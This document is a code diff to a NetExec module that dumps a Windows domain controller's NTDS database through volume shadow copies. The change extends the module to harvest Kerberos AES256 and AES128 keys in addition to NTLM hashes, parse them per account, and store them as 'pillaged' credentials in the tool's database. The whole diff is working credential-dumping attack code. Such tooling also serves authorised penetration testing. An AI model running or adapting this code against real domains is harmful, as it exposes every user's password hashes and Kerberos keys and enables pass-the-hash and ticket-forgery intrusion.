@@ -109,37 +109,79 @@ class NXCModule:
 
         host_id = context.db.get_hosts(filter_term=connection.host)[0][0]
 
-        def add_ntds_hash(ntds_hash, host_id):
-            add_ntds_hash.ntds_hashes += 1
-            if context.enabled:
-                if "Enabled" in ntds_hash:
-                    ntds_hash = ntds_hash.split(" ")[0]
-                    context.log.highlight(ntds_hash)
-            else:
-                ntds_hash = ntds_hash.split(" ")[0]
-                context.log.highlight(ntds_hash)
-            if ntds_hash.find("$") == -1:
-                if ntds_hash.find("\\") != -1:
-                    domain, clean_hash = ntds_hash.split("\\")
+        def add_ntds_secret(secret_type, secret, host_id):
+            if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
+                # Handle NTLM hashes
+                add_ntds_secret.ntds_hashes += 1
+                if context.enabled:
+                    if "Enabled" in secret:
+                        secret = secret.split(" ")[0]
+                        context.log.highlight(secret)
                 else:
-                    domain = connection.domain
-                    clean_hash = ntds_hash
+                    secret = secret.split(" ")[0]
+                    context.log.highlight(secret)
+                if secret.find("$") == -1:
+                    if secret.find("\\") != -1:
+                        domain, clean_hash = secret.split("\\")
+                    else:
+                        domain = connection.domain
+                        clean_hash = secret
 
-                try:
-                    username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
-                    parsed_hash = f"{lmhash}:{nthash}"
-                    if validate_ntlm(parsed_hash):
-                        context.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
-                        add_ntds_hash.added_to_db += 1
-                        return
-                    raise
-                except Exception:
-                    context.log.debug("Dumped hash is not NTLM, not adding to db for now ;)")
-            else:
-                context.log.debug("Dumped hash is a computer account, not adding to db")
+                    try:
+                        username, _, lmhash, nthash, _, _, _ = clean_hash.split(":")
+                        parsed_hash = f"{lmhash}:{nthash}"
+                        if validate_ntlm(parsed_hash):
+                            context.db.add_credential("hash", domain, username, parsed_hash, pillaged_from=host_id)
+                            add_ntds_secret.added_to_db += 1
+                            return
+                        raise
+                    except Exception:
+                        context.log.debug("Dumped hash is not NTLM, not adding to db for now ;)")
+                else:
+                    context.log.debug("Dumped hash is a computer account, not adding to db")
+            elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                # Handle Kerberos keys (AES256, AES128, etc.)
+                add_ntds_secret.kerberos_keys += 1
+                if context.enabled:
+                    if "Enabled" in secret:
+                        secret = secret.split(" ")[0]
+                        context.log.highlight(secret)
+                else:
+                    secret = secret.split(" ")[0]
+                    context.log.highlight(secret)
+                
+                # Skip computer accounts
+                if secret.find("$") == -1:
+                    try:
+                        # Parse Kerberos secret format: domain\username:encryption_type:key or username:encryption_type:key
+                        if secret.find("\\") != -1:
+                            domain, rest = secret.split("\\", 1)
+                        else:
+                            domain = connection.domain
+                            rest = secret
+                        
+                        # Extract encryption type and key
+                        secret_lower = secret.lower()
+                        if "aes256-cts-hmac-sha1-96" in secret_lower:
+                            # Format: domain\username:aes256-cts-hmac-sha1-96:key
+                            key = rest.split(":")[-1]
+                            username = rest.split(":")[0]
+                            context.db.add_credential("aes256", domain, username, key, pillaged_from=host_id)
+                            add_ntds_secret.added_to_db += 1
+                        elif "aes128-cts-hmac-sha1-96" in secret_lower:
+                            # Format: domain\username:aes128-cts-hmac-sha1-96:key
+                            key = rest.split(":")[-1]
+                            username = rest.split(":")[0]
+                            context.db.add_credential("aes128", domain, username, key, pillaged_from=host_id)
+                            add_ntds_secret.added_to_db += 1
+                    except Exception as e:
+                        context.log.debug(f"Error parsing Kerberos secret: {e}")
+                else:
+                    context.log.debug("Dumped Kerberos key is a computer account, not adding to db")
 
-        add_ntds_hash.ntds_hashes = 0
-        add_ntds_hash.added_to_db = 0
+        add_ntds_secret.ntds_hashes = 0
+        add_ntds_secret.kerberos_keys = 0
+        add_ntds_secret.added_to_db = 0
 
         connection.output_filename = connection.output_file_template.format(output_folder="ntds")
 
@@ -151,19 +193,20 @@ class NXCModule:
             noLMHash=no_lm_hash,
             remoteOps=None,
             useVSSMethod=True,
-            justNTLM=True,
+            justNTLM=False,
             pwdLastSet=False,
             resumeSession=None,
             outputFileName=connection.output_filename,
             justUser=None,
             printUserStatus=True,
-            perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id),
+            perSecretCallback=lambda secretType, secret: add_ntds_secret(secretType, secret, host_id),
         )
 
         try:
             context.log.success("Dumping the NTDS, this could take a while so go grab a redbull...")
             NTDS.dump()
-            context.log.success(f"Dumped {highlight(add_ntds_hash.ntds_hashes)} NTDS hashes to {connection.output_filename}.ntds of which {highlight(add_ntds_hash.added_to_db)} were added to the database")
+            total_secrets = add_ntds_secret.ntds_hashes + add_ntds_secret.kerberos_keys
+            context.log.success(f"Dumped {highlight(total_secrets)} NTDS secrets ({highlight(add_ntds_secret.ntds_hashes)} NTLM hashes, {highlight(add_ntds_secret.kerberos_keys)} Kerberos keys) to {connection.output_filename}.ntds of which {highlight(add_ntds_secret.added_to_db)} were added to the database")
 
             context.log.display("To extract only enabled accounts from the output file, run the following command: ")
             context.log.display(f"grep -iv disabled {connection.output_filename}.ntds | cut -d ':' -f1")
